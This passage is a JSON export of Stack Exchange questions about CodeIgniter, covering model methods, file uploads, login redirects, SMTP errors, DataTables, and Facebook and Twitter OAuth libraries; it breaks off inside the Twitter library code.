\"https://encrypted-tbn3.gstatic.com/images?q=tbn:ANd9GcSmvuJxRjL6C_aprr--I7detJud6l_jKXdgwrQP43bZkm449F-vp2T-\"\n                }\n            ]\n        }\n    },\n    {\n        \"kind\": \"customsearch#result\",\n        \"title\": \"Online Shopping Mall - Online Stores | Shopping Centers | Outlet Malls\",\n        \"htmlTitle\": \"&lt;b&gt;Online Shopping Mall&lt;/b&gt; - Online Stores | Shopping Centers | Outlet Malls\",\n        \"link\": \"http://www.online-internet-shopping-mall.com/\",\n        \"displayLink\": \"www.online-internet-shopping-mall.com\",\n        \"snippet\": \"Many Online Stores on this shopping mall website, online shopping malls,   shopping centers, outlet malls are just a click away at online shopping mall.\",\n        \"htmlSnippet\": \"Many Online Stores on this shopping mall website, &lt;b&gt;online shopping malls&lt;/b&gt;, &lt;br&gt;  shopping centers, outlet malls are just a click away at &lt;b&gt;online shopping mall&lt;/b&gt;.\",\n        \"cacheId\": \"5CzLC80fRAkJ\",\n        \"formattedUrl\": \"www.online-internet-shopping-mall.com/\",\n        \"htmlFormattedUrl\": \"www.&lt;b&gt;online&lt;/b&gt;-internet-&lt;b&gt;shopping&lt;/b&gt;-&lt;b&gt;mall&lt;/b&gt;.com/\",\n        \"pagemap\": {\n            \"cse_image\": [\n                {\n                    \"src\": \"http://www.online-internet-shopping-mall.com/images/online-internet-shopping-mall1.png\"\n                }\n            ],\n            \"cse_thumbnail\": [\n                {\n                    \"width\": \"225\",\n                    \"height\": \"225\",\n                    \"src\": \"https://encrypted-tbn2.gstatic.com/images?q=tbn:ANd9GcQGTMNDeUWOwQ5ODDgGfav35KPGyn0ijbSXrhgSdgkNb097NT4HCJOz-2Yo\"\n                }\n            ]\n        }\n    }\n]\n</code></pre>\n\n<p>}</p>\n"},{"tags":["codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":24,"score":0,"question_id":13274760,"title":"Calling method on object in CodeIgniter","body":"<p>Why can't I call methods directly on my object in CodeIgniter?</p>\n\n<p>For example:</p>\n\n<pre><code>$campaign = $this-&gt;Campaign_model-&gt;get_campaign_from_id($campaign_id);\n$campaign-&gt;load_settings(); // returns error: Call to undefined method stdClass::load_settings()\n</code></pre>\n\n<p>The Campaign object is correctly created, but I can't call methods on it even if it's within the class.</p>\n\n<p>Here is my Campaign_model method I'm calling:</p>\n\n<pre><code>function load_settings()\n{\n    echo \"test\";\n    exit;\n}\n</code></pre>\n\n<p>How can I do this kind of operations then? I think I was respecting basic object logic, but I can't make it work.</p>\n"},{"tags":["php","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":13274780,"title":"How to call a function which is outside of CodeIgniter application in Controller?","body":"<p>Hi I have a doubt about how to call a function which is defined in normal core php file. Now i want to call this function in controller of Codeigniter application. </p>\n\n<p>What i mean is for example there is a function named with getdetails() in test.php in some directory. Now there is a codeIgniter application which has controller email.php.</p>\n\n<p>Now i want to call getdetails() function in email.php.</p>\n\n<p>Can anyone help me with some ideas.</p>\n"},{"tags":["codeigniter","codeigniter-2","codeigniter-form-helper"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":21,"score":2,"question_id":13273298,"title":"Upload the image path into db and image in the folder name upload","body":"<p>This is the controller:</p>\n\n<pre><code>public function category()\n    {\n        if($this-&gt;form_validation-&gt;run()==FALSE)\n        {\n            $this-&gt;load-&gt;view('admin/home');\n        }\n        else{\n                $config['upload_path'] = 'uploads/';\n        $config['allowed_types'] = 'gif|jpg|png';\n        $config['max_size'] = '100';\n        $config['max_width']  = '1024';\n        $config['max_height']  = '768';\n                $this-&gt;load-&gt;library('upload', $config);\n                $image_data=$_POST['file'];\n            if ( ! $this-&gt;upload-&gt;do_upload())\n            {\n                // no file uploaded or failed upload\n                $error = array('error' =&gt; $this-&gt;upload-&gt;display_errors());\n                $this-&gt;load-&gt;view('admin/home', $error);\n            }\n            else\n            {\n                // success\n                $data = array('upload_data' =&gt; $this-&gt;upload-&gt;data());\n                $this-&gt;your_upload_model-&gt;add($title, $description, $data[\"file_name\"]);\n\n                $this-&gt;load-&gt;view('upload_success', $data);\n            }\n        }\n\n    }\n</code></pre>\n\n<p>This is the view:</p>\n\n<pre><code>&lt;?php echo validation_errors();?&gt;\n        &lt;?php echo form_open_multipart('login/category');?&gt;\n        &lt;?php\n        if(isset($error))\n        {\n            echo $error;\n        }\n        ?&gt;\n&lt;table&gt;\n&lt;tr&gt;\n        &lt;td align=right&gt;Logo:&lt;/td&gt;\n\n        &lt;td&gt;&lt;input type=\"file\" name=\"file\"&gt;&lt;/td&gt;\n        &lt;td&gt;&lt;input type=\"submit\" value=\"submit\"&gt;&lt;/td&gt;\n\n        &lt;/tr&gt;\n\n        &lt;/table&gt; \n</code></pre>\n\n<p>I am getting two errors:</p>\n\n<ol>\n<li>Message: Undefined index: file </li>\n<li>You did not select a file to upload.</li>\n</ol>\n\n<p>Even though textfield names are same and I used <code>form_open_multipart()</code>. Also, the image is not uploaded and the errors are not helpful.</p>\n"},{"tags":["codeigniter","url"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":13273058,"title":"CodeIgniter Remove Function From URL","body":"<p>I have a login form that is using CI form validation. </p>\n\n<p>The form is at domain.com/login</p>\n\n<p>It runs a function called validate_credentials and if the validation fails it reloads the view. The problem is the URL continues to show: </p>\n\n<p>domain.com/login/validate_credentials</p>\n\n<p>How can I remove the /validate_credentials?</p>\n\n<pre><code>&lt;?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');\n\nclass Login extends CI_Controller {\n\n    public function index()\n    {\n    $this-&gt;load-&gt;library('form_validation');\n\n    $this-&gt;form_validation-&gt;set_rules('email', 'Email', 'trim|required|valid_email');\n    $this-&gt;form_validation-&gt;set_rules('password', 'Password', 'required');\n\n    $this-&gt;form_validation-&gt;set_error_delimiters('&lt;div class=\"alert alert-error\"&gt;', '&lt;/div&gt;&lt;br /&gt;');\n\n    if ($this-&gt;form_validation-&gt;run() == FALSE)\n    {\n        $this-&gt;load-&gt;view('login/login');\n    }\n    else\n    {\n        $this-&gt;load-&gt;view('clock/clock');\n    }\n\n}\n\nfunction validate_credentials() {\n    $this-&gt;load-&gt;model('membership_model');\n    $query = $this-&gt;membership_model-&gt;validate();\n\n    if($query) {// staff credentials validated...\n        $data = array(\n                'email' =&gt; $this-&gt;input-&gt;post('email'),\n                'staff_logged_in' =&gt; TRUE\n            );\n\n            $this-&gt;session-&gt;set_userdata($data);\n            redirect('clock/clock');\n    }\n\n    else {  // not validated reload index function\n        $this-&gt;index();\n    }\n}\n\n}\n</code></pre>\n"},{"tags":["php","apache","codeigniter","https","nginx"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":23,"score":0,"question_id":13271137,"title":"Codeigniter on Nginx generates https action for form, but not Apache","body":"<p>I have a Codeigniter app with a login form. I ran it both on Apache and Nginx. On Apache, everything works fine, and the form action is normal. But on Nginx, the form action uses <code>https</code> instead of <code>http</code>(which I don't want at the moment).</p>\n\n<p>I generate the form using this:</p>\n\n<pre><code>&lt;?php echo form_open(site_url('/user/do_login')); ?&gt;\n</code></pre>\n\n<p>and it produces this:</p>\n\n<pre><code>&lt;form action=\"https://example.com/index.php/user/do_login\" method=\"post\" accept-charset=\"utf-8\"&gt;\n</code></pre>\n\n<p>How can I force it to generate <code>http</code> instead of <code>https</code> on Nginx?</p>\n"},{"tags":["php","codeigniter","codeigniter-2"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":13272096,"title":"Sending $data Variable From Model To View","body":"<p>Okay, so I have this snippet of code in a controller. However, it's all DB driven and should really be in model - I get that. However, as you can see in the IF statement, I need to pass along $data to my view. Based on the outcome. I tried pasting this chuck of coding in a method in my model (calling the model method via controller), however the $data[update_prompt] string is not getting called by the view...</p>\n\n<p>How would I translate this code into a model - sending the $data values back to my controller to embed in my view?</p>\n\n<pre><code>    // show appropriate upgrade message if user has free account\n\n    $id = $this-&gt;session-&gt;userdata('user_id'); \n\n    $this-&gt;db-&gt;select('subscription'); // select the subscription column\n    $this-&gt;db-&gt;where('id', $id); //find id in table that matches session id\n    $query = $this-&gt;db-&gt;get(\"subscriptions\"); // connect to this database\n    $subscribe = $query-&gt;result_array(); //returns the result of the above\n\n    if($subscribe[0]['subscription'] == 'freebie') // if subscription column equals 'freebie' in the $subscribe array, do this:\n    {\n        $data['update_prompt'] = $this -&gt; load -&gt; view('shared/upgrade_subscription', '', TRUE); // adds view within view, $update_prompt\n    }\n    else \n    {\n        $data['update_prompt'] = '';\n    }\n</code></pre>\n"},{"tags":["codeigniter","email","smtp"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":10,"score":0,"question_id":13271853,"title":"SMTP Codeigniter email error '354 End data with .'","body":"<p>I'm having trouble getting the Codeigniter email library working on a new server.</p>\n\n<p>This code has previously worked before but has recently stopped working and I cannot for the life of me figure out why. Essentially, here is the code:</p>\n\n<pre><code> $this-&gt;email-&gt;from('example@example.com', 'Intranet');\n $this-&gt;email-&gt;to($c['email']);//This is def a valid email\n\n //$name is being obtained from elsewhere\n\n $this-&gt;email-&gt;subject('Time manager reminder');\n $this-&gt;email-&gt;message(\"\n   {$name[0]},\n   &lt;br/&gt;&lt;br/&gt;You haven’t completed your time for today. Please don’t forget to do so&lt;br/&gt;&lt;br/&gt;\n   Intranet\n  \");\n\n $this-&gt;email-&gt;send();\n</code></pre>\n\n<p>And the email.php config password</p>\n\n<pre><code>$config['mailtype'] = \"html\";\n$config['priority'] = 1;\n$config['protocol'] = \"smtp\";\n\n$config['smtp_host'] = \"my server..\";\n$config['smtp_user'] = \"u/n\";\n$config['smtp_pass'] = \"p/w\";\n\n$config['smtp_timeout'] = 1;\n$config['validate'] = true;\n</code></pre>\n\n<p>The error I receive from <code>$this-&gt;email-&gt;print_debugger();</code>          is as follows:</p>\n\n<pre><code>data: 354 End data with .\n\nThe following SMTP error was encountered: \nUnable to send email using PHP SMTP. Your server might not be configured to send mail using this   method.\n</code></pre>\n\n<p>You can view the full error on pastebin here <a href=\"http://pastebin.com/y9UeaEGY\" rel=\"nofollow\">http://pastebin.com/y9UeaEGY</a></p>\n\n<p>I've crossed out the emails in all places, but I can assure you they are valid and used email addresses.</p>\n\n<p>I'd appreciate any help you can offer. Thanks</p>\n"},{"tags":["codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":13210781,"title":"Generate XML file from database - Codeigniter","body":"<p>can anyone explain me how to create xml file from database using codeigniter.</p>\n\n<p>I like to create simple xml file dynamically...</p>\n"},{"tags":["php","javascript","json","codeigniter","datatable"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":24,"score":-1,"question_id":13270920,"title":"codeigniter datatable send variable to datatable query","body":"<p>i used library datatable and codeigniter</p>\n\n<p>i have a variable in view</p>\n\n<pre><code>$afd = \"1\"\n</code></pre>\n\n<p>and in this view i have a javascript </p>\n\n<pre><code>&lt;script type=\"text/javascript\" charset=\"utf-8\"&gt;\n\n$(document).ready(function() {\n$('#datatables').dataTable( {\n\"bJQueryUI\":true,\n\n\"bProcessing\": true,\n\n\"bServerSide\": true,\n\n\"sPaginationType\":\"full_numbers\",\n\n\"sAjaxSource\": \"&lt;?=base_url()?&gt;index.php/report/report/ajax_view_panen/\",\n\n\"aaSorting\": [[ 0, \"asc\" ]]\n\n});\n\n});  &lt;/script&gt;\n</code></pre>\n\n<p>to call datatables in controller codeigniter . the function controller is \"ajax_view_panen\"</p>\n\n<p>this is my controller</p>\n\n<pre><code>function ajax_view_panen()\n{\n$this-&gt;load-&gt;library('Datatables');\n$this-&gt;datatables-&gt;from('panen');\n$this-&gt;datatables-&gt;select('id,jml_panen,hariff_blok_id,hariff_afdeling_id,tgl_panen,bulan');\n$this-&gt;datatables-&gt;where('id', $afd);\necho $this-&gt;datatables-&gt;generate();\n}\n</code></pre>\n\n<p>the question is how to send variable <code>$afd</code> to my controller. so the variable is inside query <code>$this-&gt;datatables-&gt;where('id', $afd);</code> so the datatables show <code>id = 1</code></p>\n\n<p>sory for my bad english.</p>\n\n<p>BR</p>\n\n<p>Alex</p>\n"},{"tags":["codeigniter","view","config"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":27,"score":0,"question_id":13270367,"title":"Define custom variable in config.php and access it in view","body":"<p>I have defined image_path in config.php and now need to access this variable in views like we use base_url().</p>\n\n<p>Hos is it possible?</p>\n"},{"tags":["php","mysql","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":40,"score":1,"question_id":13268300,"title":"Reverse wildcard search in codeigniter","body":"<p>I am implementing a snippet-based content management system into my current project. Snippets can be associated with a page either by exact match of the full url falling back to a wildcard match on a partial url or finally a default snippet.</p>\n\n<p>To implement this I have a created table of page associations with a wildcard flag, the system first checks the current url against the non-wildcard associations and if it doesn't find a match it checks against the partial url's where the wildcard flag is set.</p>\n\n<p>In order to achieve this I am getting all the partial url's from the database and putting them into an array then walking the array to check for a match against the current url:</p>\n\n<pre><code>protected function _check_wildcard($url = NULL)\n{\n    if($url)\n    {\n        $q = $this-&gt;db-&gt;where('wildcard' ,'Y')\n                -&gt;from('content')\n                -&gt;get();\n        $wildcards = $q-&gt;result_array();\n\n        foreach($wildcards AS $wildcard)\n        {\n            if(strpos($url,$wildcard['url']) !== FALSE )\n            {\n                return $wildcard['snippet_id'];\n            }\n        }\n    }\n    else\n    {\n        return NULL;\n    }\n}\n</code></pre>\n\n<p>Can anyone suggest a better way to do this - preferably one that doesn't involve having to constantly download the full list of all the wildcards each time I load a page as I am afraid that this will have a negative effect on the scalability of the system down the line?</p>\n"},{"tags":["facebook","codeigniter","token"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":208,"score":1,"question_id":10174363,"title":"Acces token from facebook is not retrived for sign up? access_token (trying to get propert of non object )","body":"<pre><code>    private $_api_key;\n    private $_api_secret;\n    private $_token_url     = 'oauth/access_token';\n    private $_user_url      = 'me';\n    private $_data          = array();\n\n    function __construct()\n    {\n        $this-&gt;_obj =$CI =&amp; get_instance();\n\n        $fb_api_id     = $CI-&gt;db-&gt;get_where('settings', array('code' =&gt; 'SITE_FB_API_ID'))-&gt;row()-&gt;string_value;\n        $fb_api_secret = $CI-&gt;db-&gt;get_where('settings', array('code' =&gt; 'SITE_FB_API_SECRET'))-&gt;row()-&gt;string_value;\n\n        $this-&gt;_api_key     = $fb_api_id;\n        $this-&gt;_api_secret  = $fb_api_secret;\n\n        $this-&gt;_token_url   = $this-&gt;_obj-&gt;config-&gt;item('facebook_api_url').$this-&gt;_token_url;\n        $this-&gt;_user_url    = $this-&gt;_obj-&gt;config-&gt;item('facebook_api_url').$this-&gt;_user_url;\n\n        $this-&gt;_set('scope', $this-&gt;_obj-&gt;config-&gt;item('facebook_default_scope'));\n\n        $this-&gt;connection = new facebookConnection();\n\n        if ( !$this-&gt;logged_in() )\n        {\n             // Initializes the callback to this page URL.\n            $this-&gt;set_callback();\n        }\n\n    }\n\n    public function logged_in()\n    {\n        return ( $this-&gt;get() === NULL ) ? FALSE : TRUE;\n    }\n\n    public function logout()\n    {\n        $this-&gt;_unset('token');\n        $this-&gt;_unset('user');\n    }\n\n    public function login_url($scope = NULL)\n    {\n        $url = \"http://www.facebook.com/dialog/oauth?client_id=\".$this-&gt;_api_key.'&amp;redirect_uri='.urlencode($this-&gt;_get('callback'));\n\n        if ( empty($scope) )\n        {\n            $scope = $this-&gt;_get('scope');\n        }\n        else\n        {\n            $this-&gt;_set('scope', $scope);\n        }\n\n        if ( !empty($scope) )\n        {\n            $url .= '&amp;scope='.$scope;\n        }\n\n        return $url;\n    }\n\n    public function login($scope = NULL)\n    {\n        $this-&gt;logout();\n\n        if ( !$this-&gt;_get('callback') ) $this-&gt;_set('callback', current_url());\n\n        $url = $this-&gt;login_url($scope);\n\n        return redirect($url);\n    }\n\n    public function get()\n    {\n        $token = $this-&gt;_find_token();\n        if ( empty($token) ) return NULL;\n\n        // $user = $this-&gt;_get('user');\n        // if ( !empty($user) ) return $user;\n\n        try \n        {\n            $user = $this-&gt;connection-&gt;get($this-&gt;_user_url.'?'.$this-&gt;_token_string());\n        }\n        catch ( facebookException $e )\n        {\n            $this-&gt;logout();\n            return NULL;\n        }\n\n        // $this-&gt;_set('user', $user);\n        return $user;\n    }\n\n    private function _find_token()\n    {\n        $token = $this-&gt;_get('token');\n\n        if ( !empty($token) )\n        {\n            if ( !empty($token-&gt;expires) &amp;&amp; intval($token-&gt;expires) &gt;= time() )\n            {\n                // Problem, token is expired!\n                return $this-&gt;logout();\n            }\n\n            $this-&gt;_set('token', $token);\n            return $this-&gt;_token_string();\n        }\n\n        if ( !isset($_GET['code']) )\n        {\n            return $this-&gt;logout();\n        }\n\n        if ( !$this-&gt;_get('callback') ) $this-&gt;_set('callback', current_url());\n\n        $token_url = $this-&gt;_token_url.'?client_id='.$this-&gt;_api_key.\"&amp;client_secret=\".$this-&gt;_api_secret.\"&amp;code=\".$_GET['code'].'&amp;redirect_uri='.urlencode($this-&gt;_get('callback'));\n        try \n        {\n            $token = $this-&gt;connection-&gt;get($token_url);\n        }\n        catch ( facebookException $e )\n        {\n            $this-&gt;logout();\n            redirect($this-&gt;_strip_query());\n            return NULL;\n        }\n\n        $this-&gt;_unset('callback');\n        if ( $token-&gt;access_token )\n        {\n            if ( !empty($token-&gt;expires) )\n            {\n                $token-&gt;expires = strval(time() + intval($token-&gt;expires));\n            }\n\n            $this-&gt;_set('token', $token);\n            redirect($this-&gt;_strip_query());\n        }\n\n        return $this-&gt;_token_string();\n    }\n\n    private function _get($key)\n    {\n        $key = '_facebook_'.$key;\n        return $this-&gt;_obj-&gt;session-&gt;userdata($key);\n    }\n\n    private function _set($key, $data)\n    {\n        $key = '_facebook_'.$key;\n        $this-&gt;_obj-&gt;session-&gt;set_userdata($key, $data);\n    }\n\n    private function _unset($key)\n    {\n        $key = '_facebook_'.$key;\n        $this-&gt;_obj-&gt;session-&gt;unset_userdata($key);\n    }\n\n    public function set_callback($url = NULL)\n    {\n        $this-&gt;_set('callback', $this-&gt;_strip_query($url));\n    }\n\n    private function _token_string()\n    {\n        return 'access_token='.$this-&gt;_get('token')-&gt;access_token;\n    }\n\n    public function append_token($url)\n    {\n        if ( $this-&gt;_get('token') ) $url .= '?'.$this-&gt;_token_string();\n\n        return $url;\n    }\n\n    private function _strip_query($url = NULL)\n    {\n        if ( $url === NULL )\n        {\n            $url = ( empty($_SERVER['HTTPS']) ) ? 'http' : 'https';\n            $url .= '://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];\n        }\n\n        $parts = explode('?', $url);\n        return $parts[0];\n    }\n</code></pre>\n\n<p>please tell me what and all retrieved from facebook as token when user tries to sign in using fb account in a site.</p>\n\n<p>I get the followin errors in this code :</p>\n\n<p>Message: Trying to get property of non-object</p>\n\n<p>Filename: libraries/Facebook_Lib.php</p>\n\n<p>Line Number: 454</p>\n\n<p>A PHP Error was encountered</p>\n\n<p>Severity: Notice</p>\n\n<p>Message: Trying to get property of non-object</p>\n\n<p>Filename: libraries/Facebook_Lib.php</p>\n\n<p>Line Number: 493</p>\n\n<p>Severity: Notice</p>\n\n<p>Message: Trying to get property of non-object</p>\n\n<p>Filename: libraries/Facebook_Lib.ph</p>\n\n<p>Line Number: 493</p>\n\n<p>all errors regarding access_token</p>\n"},{"tags":["codeigniter","codeigniter-2","codeigniter-routing"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":13265304,"title":"Redirect when wrong parameter in CodeIgniter","body":"<p>E.g. I have a working url:</p>\n\n<pre><code>http://localhost/article/154\n</code></pre>\n\n<p>Where 154 is <strong>$id</strong> of the article in db and a controller <strong>article</strong> looks like e.g.:</p>\n\n<pre><code>function index ($id = '')\n{\n\n// some code here\n\n}\n</code></pre>\n\n<p>Now, when I type something like:</p>\n\n<pre><code>http://localhost/article/154dsdead34\n</code></pre>\n\n<p>I get error because that id is not in my db. But, the php errors are shown on the page and the whole page is messedd up. </p>\n\n<p>Instead I need a redirect to my controller called <strong>custom404</strong> that can handle this (or if it is for some reason not possible at least a direct redirect('/'); to the homepage)</p>\n\n<p>The same fix for variants like (to big $id number or not found in db):</p>\n\n<pre><code>http://localhost/article/3004534534534234600234\n</code></pre>\n\n<p>or (other parameters)</p>\n\n<pre><code>http://localhost/article/154/something/derer/asdasd\n</code></pre>\n\n<p>how to do such security check in CodeIgniter?</p>\n"},{"tags":["codeigniter","orm","gas"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":10,"score":0,"question_id":13267712,"title":"GAS ORM many-many relation with attributes","body":"<p>I'm using CodeIgniter and I'm starting to work with gas orm. </p>\n\n<p>One of my <strong>m-n-relationship-tables</strong> using a <strong>composite key</strong> has also some <strong>additional attributes</strong> to the releation. </p>\n\n<p>For Example:\nTable teams, Table employees, and a m-n table which binds them together + adding the attribute role</p>\n\n<p><strong>Is it possible to get the attribute using GAS ORM?</strong></p>\n"},{"tags":["php","codeigniter","twitter"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":13,"score":0,"question_id":13265020,"title":"Error while implementing XTA2 code for twitter in CodeIgniter","body":"<p>I am using Eric Bae's third party twitter login implementation in CodeIgniter(<a href=\"https://github.com/ericbae/XTA2\" rel=\"nofollow\">https://github.com/ericbae/XTA2</a>)</p>\n\n<p>The Twitter Library(tweet.php)</p>\n\n<pre><code>class tweet {\n\n    private $_oauth = NULL;\n\n    function __construct()\n    {\n        $this-&gt;_oauth = new tweetOauth();\n    }\n\n    function __call($method, $args)\n    {\n        if ( method_exists($this, $method) )\n        {\n            return call_user_func_array(array($this, $method), $args);\n        }\n\n        return call_user_func_array(array($this-&gt;_oauth, $method), $args);\n    }\n\n    function logged_in()\n    {\n        return $this-&gt;_oauth-&gt;loggedIn();\n    }\n\n    function set_callback($url)\n    {\n        $this-&gt;_oauth-&gt;setCallback($url);\n    }\n\n    function login()\n    {\n        return $this-&gt;_oauth-&gt;login();\n    }\n\n    function logout()\n    {\n        return $this-&gt;_oauth-&gt;logout();\n    }\n\n    function get_tokens()\n    {\n        $tokens = array(\n                        'oauth_token' =&gt; $this-&gt;_oauth-&gt;getAccessKey(),\n                        'oauth_token_secret' =&gt; $this-&gt;_oauth-&gt;getAccessSecret()\n                    );\n\n        return $tokens;\n    }\n\n    function set_tokens($tokens)\n    {\n        return $this-&gt;_oauth-&gt;setAccessTokens($tokens);\n    }\n}\n\nclass tweetException extends Exception {\n\n    function __construct($string)\n    {\n        parent::__construct($string);\n    }\n\n    public function __toString() {\n        return \"exception '\".__CLASS__ .\"' with message '\".$this-&gt;getMessage().\"' in \".$this-&gt;getFile().\":\".$this-&gt;getLine().\"\\nStack trace:\\n\".$this-&gt;getTraceAsString();\n    }\n}\n\nclass tweetConnection {\n\n    // Allow multi-threading.\n\n    private $_mch = NULL;\n    private $_properties = array();\n\n    function __construct()\n    {\n        $this-&gt;_mch = curl_multi_init();\n\n        $this-&gt;_properties = array(\n            'code'      =&gt; CURLINFO_HTTP_CODE,\n            'time'      =&gt; CURLINFO_TOTAL_TIME,\n            'length'    =&gt; CURLINFO_CONTENT_LENGTH_DOWNLOAD,\n            'type'      =&gt; CURLINFO_CONTENT_TYPE\n        );\n    }\n\n    private function _initConnection($url)\n    {\n        $this-&gt;_ch = curl_init($url);\n        curl_setopt($this-&gt;_ch, CURLOPT_RETURNTRANSFER, TRUE);\n    }\n\n    public function get($url, $params)\n    {\n        if ( count($params['request']) &gt; 0 )\n        {\n            $url .= '?';\n\n            foreach( $params['request'] as $k =&gt; $v )\n            {\n                $url .= \"{$k}={$v}&amp;\";\n            }\n\n            $url = substr($url, 0, -1);\n        }\n\n        $this-&gt;_initConnection($url);\n        $response = $this-&gt;_addCurl($url, $params);\n\n        return $response;\n    }\n\n    public function post($url, $params)\n    {\n        // Todo\n        $post = '';\n\n        foreach ( $params['request'] as $k =&gt; $v )\n        {\n            $post .= \"{$k}={$v}&amp;\";\n        }\n\n        $post = substr($post, 0, -1);\n\n        $this-&gt;_initConnection($url, $params);\n        curl_setopt($this-&gt;_ch, CURLOPT_POST, 1);\n        curl_setopt($this-&gt;_ch, CURLOPT_POSTFIELDS, $post);\n\n        $response = $this-&gt;_addCurl($url, $params);\n\n        return $response;\n    }\n\n    private function _addOauthHeaders(&amp;$ch, $url, $oauthHeaders)\n    {\n        $_h = array('Expect:');\n        $urlParts = parse_url($url);\n        $oauth = 'Authorization: OAuth realm=\"' . $urlParts['path'] . '\",';\n\n        foreach ( $oauthHeaders as $name =&gt; $value )\n        {\n            $oauth .= \"{$name}=\\\"{$value}\\\",\";\n        }\n\n        $_h[] = substr($oauth, 0, -1);\n\n        curl_setopt($ch, CURLOPT_HTTPHEADER, $_h);\n    }\n\n    private function _addCurl($url, $params = array())\n    {\n        if ( !empty($params['oauth']) )\n        {\n            $this-&gt;_addOauthHeaders($this-&gt;_ch, $url, $params['oauth']);\n        }\n\n        $ch = $this-&gt;_ch;\n\n        $key = (string) $ch;\n        $this-&gt;_requests[$key] = $ch;\n\n        $response = curl_multi_add_handle($this-&gt;_mch, $ch);\n\n        if ( $response === CURLM_OK || $response === CURLM_CALL_MULTI_PERFORM )\n        {\n            do {\n                $mch = curl_multi_exec($this-&gt;_mch, $active);\n            } while ( $mch === CURLM_CALL_MULTI_PERFORM );\n\n            return $this-&gt;_getResponse($key);\n        }\n        else\n        {\n            return $response;\n        }\n    }\n\n    private function _getResponse($key = NULL)\n    {\n        if ( $key == NULL ) return FALSE;\n\n        if ( isset($this-&gt;_responses[$key]) )\n        {\n            return $this-&gt;_responses[$key];\n        }\n\n        $running = NULL;\n\n        do\n        {\n            $response = curl_multi_exec($this-&gt;_mch, $running_curl);\n            if ( $running !== NULL &amp;&amp; $running_curl != $running )\n            {\n                $this-&gt;_setResponse($key);\n\n                if ( isset($this-&gt;_responses[$key]) )\n                {\n\n                    $response = new tweetResponseOauth( (object) $this-&gt;_responses[$key] );\n                    if ( $response-&gt;__resp-&gt;code !== 200 )\n                    {\n                        throw new tweetException($response-&gt;__resp-&gt;code.' | Request Failed: '.$response-&gt;__resp-&gt;data-&gt;request.' - '.$response-&gt;__resp-&gt;data-&gt;error);\n                    }\n\n                    return $response;\n                }\n            }\n\n            $running = $running_curl;\n\n        } while ( $running_curl &gt; 0);\n\n    }\n\n    private function _setResponse($key)\n    {\n        while( $done = curl_multi_info_read($this-&gt;_mch) )\n        {\n            $key = (string) $done['handle'];\n            $this-&gt;_responses[$key]['data'] = curl_multi_getcontent($done['handle']);\n\n            foreach ( $this-&gt;_properties as $curl_key =&gt; $value )\n            {\n                $this-&gt;_responses[$key][$curl_key] = curl_getinfo($done['handle'], $value);\n\n                curl_multi_remove_handle($this-&gt;_mch, $done['handle']);\n            }\n      }\n    }\n}\n\nclass tweetResponseOauth {\n\n    private $__construct;\n\n    public function __construct($resp)\n    {\n        $this-&gt;__resp = $resp;\n\n        if ( strpos($this-&gt;__resp-&gt;type, 'json') !== FALSE )\n        {\n            $this-&gt;__resp-&gt;data = json_decode($this-&gt;__resp-&gt;data);\n        }\n    }\n\n    public function __get($name)\n    {\n        if ($this-&gt;__resp-&gt;code &lt; 200 || $this-&gt;__resp-&gt;code &gt; 299) return FALSE;\n\n        if ( is_string($this-&gt;__resp-&gt;data ) )\n        {\n            parse_str($this-&gt;__resp-&gt;data, $result);\n        }\n        else\n        {\n            $result = $this-&gt;__resp-&gt;data;\n        }\n\n        foreach($result as $k =&gt; $v)\n        {\n            $this-&gt;$k = $v;\n        }\n\n        if ( $name === '_result')\n        {\n            return $result;\n        }\n\n        return $result[$name];\n    }\n}\n\nclass tweetOauth extends tweetConnection {\n\n    private $_obj;\n    private $_tokens = array();\n    private $_authorizationUrl  = 'http://api.twitter.com/oauth/authorize';\n    private $_requestTokenUrl   = 'http://api.twitter.com/oauth/request_token';\n    private $_accessTokenUrl    = 'http://api.twitter.com/oauth/access_token';\n    private $_signatureMethod   = 'HMAC-SHA1';\n    private $_version           = '1.0';\n    private $_apiUrl            = 'http://api.twitter.com';\n    private $_searchUrl         = 'http://search.twitter.com/';\n    private $_callback = NULL;\n    private $_errors = array();\n    private $_enable_debug = FALSE;\n\n    function __construct()\n    {\n        parent::__construct();\n\n        $this-&gt;_obj =&amp; get_instance();\n        //$this-&gt;_obj-&gt;load-&gt;config('tweet'); // this is now in config file for easy access\n        //$this-&gt;_obj-&gt;load-&gt;library('session'); // we already loaded this for tank auth!\n        $this-&gt;_obj-&gt;load-&gt;library('unit_test');\n        //$this-&gt;_obj-&gt;load-&gt;helper('url'); // this is also loaded already!\n\n        $this-&gt;_tokens =    array(\n                                'consumer_key'      =&gt; $this-&gt;_obj-&gt;config-&gt;item('tweet_consumer_key'),\n                                'consumer_secret'   =&gt; $this-&gt;_obj-&gt;config-&gt;item('tweet_consumer_secret'),\n                                'access_key'        =&gt; $this-&gt;_getAccessKey(),\n                                'access_secret'     =&gt; $this-&gt;_getAccessSecret()\n                            );\n\n        $this-&gt;_checkLogin();\n    }\n\n    function __destruct()\n    {\n        if ( !$this-&gt;_enable_debug ) return;\n\n        if ( !empty($this-&gt;_errors) )\n        {\n            foreach ( $this-&gt;_errors as $key =&gt; $e )\n            {\n                echo '&lt;pre&gt;'.$e.'&lt;/pre&gt;';\n            